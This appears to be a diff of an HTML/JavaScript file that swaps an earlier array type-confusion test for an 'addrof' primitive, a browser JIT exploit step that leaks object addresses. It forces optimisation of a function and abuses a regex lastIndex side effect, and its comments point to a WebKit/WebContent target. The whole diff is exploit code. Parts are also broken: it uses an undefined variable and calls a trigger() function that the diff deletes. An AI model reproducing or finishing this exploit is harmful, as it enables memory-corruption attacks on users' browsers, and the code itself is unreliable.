@@ -1,30 +1,59 @@
 <script>
-alert("here");
-alert("yes")
-function NoCow(array) {
-     array[0] = 13.37
-     return array;
-}
+let print = alert;
 
-function trigger () {
-   var arrayc = [{},13.37,1];
-   for (var l = 0; l < 10000; l++) {
-    NoCow(arrayc);
-    if(l == 10000) {
-       arrayc[1] = { a : 0x41414141 };
-       arrayc = NoCow(arrayc);
-       
-    }
-    if(l == 9999) {
-    // let array = new Float64Array(8);
-alert(arrayc)
+
+function addrofInternal(val) {
+    var array = [13.37];
+    let string = "ABABABABAB";
+    var reg = /ABC/y;
+    reg.split(" ")
+    reg.match(/A/g)
+    
+    function getarray() {
+        return array;
     }
     
-   }
+    // Target function
+    var AddrGetter = function(array) {
+        for (var i = 2; i < array.length; i++) {
+            if (num % i === 0) {
+                return false;
+            }
+        }
+        
+        array = getarray();
+        reg[Symbol.match](val === null);
+        return array[0];
+    }
+    
+    // Force optimization
+    for (var i = 0; i < 100000; ++i)
+        AddrGetter(array);
+    
+    // Setup haxx
+    regexLastIndex = {};
+    regexLastIndex.toString = function() {
+        array[0] = val;
+        return "0";
+    };
+    reg.lastIndex = regexLastIndex;
+    
+    // Do it!
+    return AddrGetter(array);
+}
 
-alert(arrayc[1])
-     alert(arrayc)
+// Need to wrap addrof in this wrapper because it sometimes fails (don't know why, but this works)
+function addrof(val) {
+    for (var i = 0; i < 100; i++) {
+        var result = addrofInternal(val);
+        if (typeof result != "object" && result !== 13.37){
+            return result;
+        }
+    }
+    
+    print("[-] Addrof didn't work. Prepare for WebContent to crash or other strange stuff to happen...");
+    throw "See above";
+}
 
-} 
 trigger()
 </script>
